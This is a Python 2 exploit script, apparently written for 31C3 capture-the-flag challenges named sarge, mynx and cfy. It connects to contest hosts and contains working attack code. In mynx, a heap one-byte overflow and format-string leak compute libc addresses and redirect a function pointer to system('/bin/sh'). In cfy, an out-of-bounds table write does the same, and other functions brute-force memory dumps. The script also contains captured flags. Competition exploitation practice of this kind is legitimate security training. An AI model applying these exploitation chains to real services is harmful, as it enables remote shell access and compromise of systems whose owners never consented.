__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop

'''
ip: booty.9447.plumbing
port: 9447
'''
def sarge():
    '''
    sarge running on 188.40.18.82 1234
    '''
    import msgpack
    import array

    class Sargecmd:
        def __init__(self, data):
            self.command = data
        def run(self):
            print self.command

    def objecthook(code, data):
        if code == 42:
            return Sargecmd(data)
        return msgpack.ExtType(code, data)

    msgpack_string = {"authentication":"s3cr3t","execute":msgpack.ExtType(42,'ls -l'),"zzzzz":'aa'}
    msgpack_object = msgpack.packb(msgpack_string)
    data = msgpack.unpackb(msgpack_object, ext_hook = objecthook)
    data["execute"].run()
    print data
    print len(msgpack_object)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "188.40.18.82"
    local_host="192.168.248.136"
    port = 1234
    local_port = 9446
    print 'Test remote ...'
    # socat TCP-LISTEN:9446,reuseaddr,fork EXEC:"python server.py"
    s.connect((host, port))
    #s.connect((local_host, local_port))
    #print msgpack_object
    s.send(msgpack_object+'\n')
    print msgpack_object.encode('hex')
    #print s.recv(1000)
    final_interact(s)
#sarge()

def pin_30():
    '''
    nc 188.40.18.84 1234
    '''

def maze():
    '''
    Where do you want to go (today)?

    nc 188.40.18.71 1234
    '''

def mynx():
    '''
    mynx running on 188.40.18.80 1234
    '''
    INVERT_FILTER = 0
    LOLOLO_FILTER = 1
    INVERSION_FILTER = 2

    ADD_COMMENT = 1
    REMOVE_ALL_COMMENTS = 2
    APPLY_FILTER = 3
    BACK = 0

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "188.40.18.80"
    local_host="192.168.248.136"
    port = 1234
    local_port = 9446

    s.connect((host, port))
    #s.connect((local_host, local_port))
    raw_input('....')
    def add_ascii_art(data, filter):
        global art_index
        s.send('1\n')
        print recv_until(s,'> ')
        s.send(str(filter)+'\n')
        print recv_until(s, 'enter your ascii art >>>')         # recv("enter your ascii art >>>)
        s.send(data+'\n')

    def browser_ascii_art():
        s.send('2\n')
        data = recv_until(s, '> ')
        return data

    def select_ascii_art():
        print 'aaaa'


    art_index = 0
    comment_data = '6'*250+'\n'
    data_art = '%08x'*50

    def free_comment(numArtIndexFreed):
        print recv_until(s,'> ')
        s.send('3\n')
        print recv_until(s, 'enter ascii art id')
        s.send(str(numArtIndexFreed)+'\n')         # index art to free comment - art_id=1
        print recv_until(s, '0.) back\n>')   # recv menu
        s.send('2\n')                       # puts("2.) remove all comments");
        print recv_until(s, '0.) back\n>')   # recv menu
        s.send('0\n')                       # send ("0.) back") option

    def add_comment(index, data):
        print recv_until(s, '> ')   # print menu
        s.send('3\n')
        print recv_until(s, 'enter ascii art id')
        s.send(str(index)+'\n')
        print recv_until(s, '0.) back\n>')   # recv menu
        s.send('1\n')                       # send("1.) add comment"); ---- 1
        print recv_until(s, '\n> ')         # recv("enter your comment for no. %i\n> ",
        s.send(data)                # khong co '\n' ko biet dc ko???
        print recv_until(s, '0.) back\n>')   # recv menu
        s.send('0\n')                       # send ("0.) back") option

    print '[+] tao art object 1'
    print recv_until(s,'> ')
    add_ascii_art(data_art, INVERT_FILTER)
    art_index += 1
    # add comment o giua
    add_comment(1, comment_data)

    print '[+] tao art object 2'
    print recv_until(s,'> ')
    add_ascii_art(data_art, INVERT_FILTER)
    art_index += 1
    # add comment o giua
    add_comment(2, comment_data)

    print '[+] tao art object 3'
    print recv_until(s,'> ')
    add_ascii_art(data_art, INVERT_FILTER)
    art_index += 1
    # add comment o giua
    add_comment(3, comment_data)

    print '[+] free comment art 1'
    free_comment(1)

    print '[+] add comment art 2'
    add_comment(2,comment_data)

    print '[+] free comment art 2'
    numArtIndexFreed = 2
    free_comment(numArtIndexFreed)

    print '[+] add comment art 1'
    numArtIndexAdded = 1
    comment_data = '\x48'*251+'\x48'         # send data comment
    add_comment(numArtIndexAdded, comment_data)

    print '[+] add comment art 3'
    printf_address = 0x08048420
    OverwriteData = pi(printf_address)+'%08x'*10+'\n'
    add_comment(3, OverwriteData)

    print '[+] free comment art 1'
    free_comment(1)

    print '[+] add comment art 1'
    comment_data = '\x48'*251+'\x48'         # send data comment - overflow 1 byte!!!!!
    add_comment(numArtIndexAdded, comment_data)

    print '[+] call  filter art 3 => BUG'
    print recv_until(s, '> ')   # print menu
    s.send('3\n')
    print recv_until(s, 'enter ascii art id')
    s.send('3\n')                               #send id art 3 = 3
    print recv_until(s,'0.) back\n>')            # recv menu
    s.send(str(APPLY_FILTER)+'\n')              # send 3 => apply filter

    print '[+] Calculate system address ....'
    libc_start_main_delta = 0x19970
    system_delta = 0x3E2B0
    data = recv_until(s, '\n')
    print data
    data = recv_until(s, '\n')
    print data
    print hex(int(data[3:11],16))
    libc_start_main_address = int(data[3:11],16) - libc_start_main_delta - 0xf3
    print hex(libc_start_main_address)
    system_address = libc_start_main_address + system_delta
    print hex(system_address)

    print recv_until(s, '0.) back\n>')   # recv menu
    s.send('0\n')                       # send ("0.) back") option


    print '[+] ======================================================================================'
    print '[+] call to system("/bin/sh")'
    print '[+] tao art object 4'
    print recv_until(s,'> ')
    add_ascii_art(data_art, INVERT_FILTER)
    art_index += 1
    # add comment o giua
    add_comment(art_index, comment_data)

    print '[+] tao art object 5'
    print recv_until(s,'> ')
    add_ascii_art(data_art, INVERT_FILTER)
    art_index += 1
    # add comment o giua
    add_comment(art_index, comment_data)

    print '[+] tao art object 6'
    print recv_until(s,'> ')
    add_ascii_art(data_art, INVERT_FILTER)
    art_index += 1
    # add comment o giua
    add_comment(art_index, comment_data)

    print '[+] free comment art 4'
    free_comment(4)

    print '[+] add comment art 5'
    add_comment(5,comment_data)

    print '[+] free comment art 5'
    numArtIndexFreed = 5
    free_comment(numArtIndexFreed)

    print '[+] add comment art 4'
    numArtIndexAdded = 4
    comment_data = '\x48'*251+'\x48'         # send data comment
    add_comment(numArtIndexAdded, comment_data)

    print '[+] add comment art 6'
    OverwriteData = pi(system_address)+'/bin/sh\x00'*3+'\n'
    add_comment(6, OverwriteData)

    print '[+] free comment art 4'
    free_comment(4)

    print '[+] add comment art 4'
    comment_data = '\x48'*251+'\x48'         # send data comment - overflow 1 byte!!!!!
    add_comment(4, comment_data)

    print '[+] call to system("/bin/sh")'
    print recv_until(s, '> ')   # print menu
    s.send('3\n')
    print recv_until(s, 'enter ascii art id')
    s.send('6\n')                               #send id art 3 = 6
    print recv_until(s,'0.) back\n>')            # recv menu
    s.send(str(APPLY_FILTER)+'\n')              # send 3 => apply filter

    s.send('ls -l\n')
    print s.recv(1024)
    print '[+] END ... '

    final_interact(s)
    # 0804A900 g_gallery_array
# 31C3_i_like_weird_allocators
#mynx()

def cfy():
    '''
    cfy running on 188.40.18.73 3313
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "188.40.18.73"
    #host="192.168.248.136"
    port = 3313
    s.connect((host, port))

    input_address = 0x06010E0
    parser_address = 0x601080
    fgets_address = 0x0601030

    system_delta = 0x44B30
    fgets_delta = 0x06ED90
    #raw_input('enter to ...')

    # dump printf
    print recv_until(s, '3) quit\n')
    s.send('2\n')
    print recv_until(s, 'Please enter your number: ')
    data = pq(fgets_address)+pq(input_address+8)+pq(fgets_address)
    s.send(data+'\n')

    recv_data = recv_until(s,'\n')
    #print recv_data
    base_address = int(recv_data[5:])-fgets_delta
    system_address = base_address + system_delta
    bin_sh_string = '/bin/sh\x00'
    data2 = bin_sh_string + 'a'*(0x20-len(bin_sh_string)) + pq(system_address)*0x20

    #print recv_until(s, '3) quit\n')
    recv_until(s, '3) quit\n')
    index1 = (input_address - parser_address + 0x40)/0x10
    s.send(str(index1)+'\n')
    print recv_until(s, 'Please enter your number: ')
    s.send(data2+'\n')
    time.sleep(0.01)
    s.send('uname -a\n')

    # cfy2 ....................................
    return s
#s = cfy()
def dump_mem(s, address_to_dump):
    s.send('2\n')
    recv_until(s, 'Please enter your number: ')
    data = pq(address_to_dump)
    s.send(data+'\n')

def cfy2_brute_system():

    got_table = [0x602280, 0x602290, 0x602218, 0x602220, 0x602230, 0x602240, 0x602248,0x602268,0x602270,0x602260]

    mprotect_address = 0x602280
    real_ = 0x070+228*0x1000
    mprotect_ = 0x070

    s = cfy()

    input_address = 0x602360
    parser_address = 0x6022c0

    s.send('nc 127.0.0.1 3314\n')
    print recv_until(s, '3) quit\n')

    print '[+] mprotect got address ...' + str(hex(mprotect_address))
    dump_mem(s, mprotect_address)  # 0x7faf92f8b070L

    recv_data = recv_until(s,'\n')
    temp_address = int(recv_data[5:])
    print '[+] ' + str(hex(temp_address))

    begin_range = 0x34c48
    end_range = 0x34c8
    t=''
    base_libc = temp_address-mprotect_-228*0x1000
    recv_until(s, '3) quit\n')
    dump_mem(s, base_libc)
    recv_data = recv_until(s,'\n')
    recv_data = recv_until(s,'\n')
    temp1 = recv_data[7:]
    beauty_print(pq(int(temp1,16)))


    for j in range(0,3):
        t = base_libc+begin_range+j*8
        print ('[-]' + str(hex(j)) + ' ' + str(hex(t))+' ').ljust(100, '-')
        recv_until(s, '3) quit\n')
        dump_mem(s, t)
        recv_data = recv_until(s,'\n')
        recv_data = recv_until(s,'\n')
        temp1 = pq(int(recv_data[7:],16))
        beauty_print(temp1)
        if temp1 == '\x41\x54\x31\xC0\xB9\x10\x00\x00':
            exit(0)
        time.sleep(0.01)
        print '[-]'.ljust(100, '-')

'''
TIM BASE CUA LIBC
    loop = 0x100
    for j in range(0xd0, loop):
        t = temp_address-mprotect_-j*0x1000
        print ('[-]' + str(j) + ' ' + str(hex(t))+' ').ljust(100, '-')
        recv_until(s, '3) quit\n')
        dump_mem(s, t)
        recv_data = recv_until(s,'\n')
        recv_data = recv_until(s,'\n')
        temp1 = recv_data[7:]
        beauty_print(pq(int(temp1,16)))
        time.sleep(0.01)
        print '[-]'.ljust(100, '-')
    time.sleep(0.1)
'''

#cfy2_brute_system()

def cfy2(max_loop,input_address):
    '''
    1) Pwn cfy 2) nc 127.0.0.1 3314
    '''
    count = 0
    while count <= max_loop:
        temp_address = input_address+8*count
        s = cfy()
        print '==========================================================='
        print hex(temp_address),
        print count
        s.settimeout(7)
        s.send('nc 127.0.0.1 3314\n')
        try:
            print recv_until(s, '3) quit\n')
            dump_mem(s,temp_address)
            print recv_until(s, '3) quit\n')
            #print s.recv(1000)
        except:
            pass
        count+=1
        print '=============================        END =================='

def test_one():
    input_address = 0x6022f0   # khong chinh xac - doan bua thoi
    max_loop = 0
    cfy2(max_loop, input_address)
#test_one()
def loop_all():
    input_address = 0x400600   # khong chinh xac - doan bua thoi
    max_loop = 20
    cfy2(max_loop, input_address)
#loop_all()
'''
fgets
Please enter your number:
dec: 140448751778976
hex: 0x7fbcc5f57ca0

puts
Please enter your number:
dec: 140106637306176
hex: 0x7f6d1e58e940

31C3_G0nna_keep<on>grynding
'''

